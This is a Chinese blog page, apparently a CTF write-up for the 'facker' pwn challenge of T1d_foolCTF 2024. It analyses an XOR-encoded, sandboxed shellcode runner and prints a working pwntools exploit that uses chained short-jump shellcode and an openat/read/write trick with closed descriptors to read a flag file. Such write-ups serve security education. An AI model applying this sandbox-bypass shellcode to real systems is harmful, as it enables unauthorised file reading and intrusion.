<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
            if (label) {
                label.textContent = isDark ? "深色" : "浅色";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>T1d_foolCTF 2024 Writeup | 花盆</title><meta name="author" content="LittFlower"/><meta name="description" content="2024 T1d_foolCTF Pwn 题解"/><meta property="og:title" content="T1d_foolCTF 2024 Writeup | 花盆"/><meta property="og:description" content="2024 T1d_foolCTF Pwn 题解"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/T1d_foolCTF2024-Writeup/README.mdx"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="stylesheet" href="/fonts.css" type="text/css" preload/><link rel="stylesheet" href="/style.css" type="text/css" preload/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="t1d_foolctf-2024-writeup" class="scroll-target"><a href="#t1d_foolctf-2024-writeup"><code class="hash inline-code">#</code>T1d_foolCTF 2024 Writeup</a></h1>
<p>愚人节的时候 t1d 在群里扔了两道题，说是愚人节ctf...</p>
<p><del>做了之后发现自己是愚人了</del></p>
<h2 id="facker" class="scroll-target"><a href="#facker"><code class="hash inline-code">#</code>facker</a></h2>
<h3 id class="scroll-target"><a href="#"><code class="hash inline-code">#</code>题目分析</a></h3>
<p>先来看看程序主体逻辑：</p>
<p><img src="https://s2.loli.net/2024/04/09/SQ7qjfXBAEyhRxp.png" alt="image.png"/></p>
<p>en.... 大概读一遍可以确定这是个 orw 题，不过一个巨大的 random 糊在脸上预示着这题可能不太好打，下面有个 encrypt 函数，会一次加密 16 字节，跟进去看看：</p>
<p><img src="https://s2.loli.net/2024/04/09/zgDesHBTQEyIYjq.png" alt="image.png"/></p>
<p>这个加密算法分两部分，前半部分可以识别出是个 base64 的 decode，后半部分是用刚才读的随机数异或编码 16 字节的前 12 字节。</p>
<p>一开始想着能不能把 <code class="inline-code">random</code> 给绕了，但是 t1d 肯定防了这个：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#393A34">fd </span><span style="color:#999999">=</span><span style="color:#59873A"> open</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">/dev/random</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">for</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34"> i </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><span style="color:#393A34"> i </span><span style="color:#AB5959">!=</span><span style="color:#2F798A"> 16</span><span style="color:#999999">;</span><span style="color:#393A34"> i </span><span style="color:#999999">=</span><span style="color:#59873A"> strlen</span><span style="color:#1e754f">(</span><span style="color:#393A34">buf</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#2993a3">)</span><br><span style="color:#59873A">  read</span><span style="color:#2993a3">(</span><span style="color:#393A34">fd</span><span style="color:#999999">,</span><span style="color:#393A34"> buf</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">10</span><span style="color:#AB5959">uLL</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#DBD7CAEE">fd </span><span style="color:#666666">=</span><span style="color:#80A665"> open</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/dev/random</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">for</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE"> i </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> i </span><span style="color:#CB7676">!=</span><span style="color:#4C9A91"> 16</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> i </span><span style="color:#666666">=</span><span style="color:#80A665"> strlen</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">buf</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">)</span><br><span style="color:#80A665">  read</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">fd</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> buf</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">10</span><span style="color:#CB7676">uLL</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br></code></pre></div>
<p>这个写法会防止读 random 时首字节为空字节导致的截断问题。所以这东西肯定是绕不了了。</p>
<p>再者，关于这个 base64，可以注意到这个 decode 并没有直接在 a1 上做，也就是并没有修改我们输进去的 orw，真正修改 orw 的是后面的异或运算。</p>
<p>（这里我狠狠踩坑了，做题的时候处于逆向习惯一直在想着怎么逆这东西，其实从宏观一点的角度思考就会发现没有修改 orw 的 base64 <code class="inline-code">decode()</code> 我们是完全可以不用理会的）</p>
<p>总结一下，可以输入 66 个字节，前 2 个字节不作处理，之后的 64 个字节分为 4 组，每组只修改了 16 个字节的前 12 个字节。</p>
<p>故可以采用 <code class="inline-code">jmp</code> 短跳转跳过每组里的 12 个字节。</p>
<p><img src="https://s2.loli.net/2024/04/09/lH4Ou9EeTQ8cPKG.png" alt="image.png"/></p>
<p>看看文档，用第一个就可以，<code class="inline-code">c</code> 是表示有符号立即数，<code class="inline-code">b</code> 是表示跳的长度占一个字节。</p>
<p>所以可以构造成 <code class="inline-code">eb 0c</code>，这个短跳转指令占 2 个字节，所以还有两个字节可以用来控制寄存器，构造一个 read syscall 出来。</p>
<p><code class="inline-code">sub_15A9()</code> 是一个沙箱函数，查看沙箱可以得知题目关了 <code class="inline-code">open</code>，<code class="inline-code">sendfile</code>，<code class="inline-code">execve</code> 等函数，不过 <code class="inline-code">read</code> 实际上是打开的，所以用 <code class="inline-code">read</code> 就行。</p>
<p><img src="https://s2.loli.net/2024/04/09/MTxb1eWSA3iFqZ5.png" alt="image.png"/></p>
<p>构造 read syscall 的时候也要根据调试时寄存器的情况注意一下，且由于执行完 syscall 之后如果没有 <code class="inline-code">push shellcode_addr; ret</code> 这种东西，肯定是会接着 <code class="inline-code">read</code> 之后的代码段跑，而前者由于长度限制没有实现可能性，只能把 read syscall 的 rsi 放在 v9 的地址上。</p>
<p>之后二次读入，没有 <code class="inline-code">open</code> 可以用 <code class="inline-code">openat</code>，打一个 orw 就可以了。</p>
<h3 id="exp" class="scroll-target"><a href="#exp"><code class="hash inline-code">#</code>exp</a></h3>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">arch </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">amd64</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">p </span><span style="color:#999999">=</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">./pwn</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">p</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\xeb\x0c</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 12</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">push rdx; pop rsi;</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\xeb\x0c</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 12</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">push rax; pop rdi;</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\xeb\x0c</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 12</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">push rax; pop rdx;</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\xeb\x0c</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 12</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">mov dl, 0xff; syscall</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">></span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># input()</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># pause()</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">42</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#393A34">shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#1e754f">(</span><span style="color:#2F798A">0</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#393A34">shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">openat</span><span style="color:#1e754f">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">/home/flower/flag</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#393A34">shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">read</span><span style="color:#1e754f">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">rbp</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">100</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#393A34">shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">write</span><span style="color:#1e754f">(</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">rbp</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">100</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># input()</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">arch </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">amd64</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">p </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">./pwn</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">p</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\xeb\x0c</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 12</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">push rdx; pop rsi;</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\xeb\x0c</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 12</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">push rax; pop rdi;</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\xeb\x0c</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 12</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">push rax; pop rdx;</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\xeb\x0c</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 12</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">mov dl, 0xff; syscall</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">></span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># input()</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># pause()</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">42</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">openat</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">/home/flower/flag</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">read</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">rbp</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">100</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">write</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">rbp</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">100</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># input()</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h3 id="trick" class="scroll-target"><a href="#trick"><code class="hash inline-code">#</code>一些 trick</a></h3>
<p>非常踩坑的点是</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#59873A">close</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">close</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#80A665">close</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">close</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br></code></pre></div>
<p>程序关了 1 2 的输出流，如果我们直接 <code class="inline-code">openat</code> 的话，这个文件会被分配到到 1 这个文件描述符上，但是这个文件描述符默认是标准输出流，至少会包括终端的标准输出，所以不管之后的 <code class="inline-code">read</code> 的参数填不填 1，都会直接导致阻塞从而程序崩溃。</p>
<p>同时，<code class="inline-code">dup(1)</code> / <code class="inline-code">dup2(1,3)</code> 这种操作也是没可能的，因为已经阻塞了。</p>
<p>所以一个 trick 就是直接 <code class="inline-code">close(0)</code> 把标准输入关了，再 <code class="inline-code">openat</code> 后 fd 就是 0，从而正常读入。</p></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>